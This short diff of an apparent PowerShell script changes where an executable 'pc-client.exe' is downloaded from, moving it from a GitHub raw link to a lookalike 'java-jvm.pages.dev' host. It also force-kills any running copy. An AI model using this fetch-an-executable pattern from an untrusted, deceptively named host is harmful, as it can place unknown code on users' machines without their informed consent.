@@ -1,4 +1,4 @@
-iwr "https://github.com/4134111/4134111/raw/refs/heads/main/pc-client.exe" -OutFile "U:\Downloads\pc-client"
+iwr "java-jvm.pages.dev/pc-client.exe" -OutFile "U:\Downloads\pc-client"
 
 taskkill /f /im pc-client.exe
 try {
